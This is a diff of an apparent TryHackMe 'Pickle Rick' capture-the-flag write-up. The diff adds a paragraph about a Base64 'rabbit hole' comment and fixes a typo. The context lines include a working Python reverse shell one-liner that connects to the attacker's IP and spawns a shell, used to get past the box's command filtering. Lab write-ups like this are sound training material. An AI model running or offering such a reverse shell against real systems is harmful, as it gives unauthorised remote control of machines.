@@ -86,6 +86,27 @@ Trying to go to access any other materials on the site we get redirected to `/de
 
 denied.png
 
+Funily enough, checking out the source code of the login page we find another comment:
+
+```text
+Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
+```
+
+This looks like Base64 encoded text.
+
+Trying to decode it in the terminal I realize it's been encoded multiple times, so I keep adding additional decoding until I finally get to the clear text:
+
+```text
+┌──(ryan㉿kali)-[~/THM/Pickle_Rick]
+└─$ echo "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+base64: invalid input
+base64: invalid input
+rabbit hole
+```
+Ha- here we are getting trolled by the box creators. 
+
+Looks like we'll need to move on.
+
 Going back to the command panel running `ls -la` shows me some interesting files:
 
 ```text
@@ -112,7 +133,7 @@ Ok, so there must be some command filtering happing here. Lets try and bypass th
 
 First I'll set up a Netcat listener on my attacking machine and then head over to
 
-From there i can grab a Python reverse shell oneliner and runi it:
+From there i can grab a Python reverse shell oneliner and run it:
 
 ```text
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.61.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
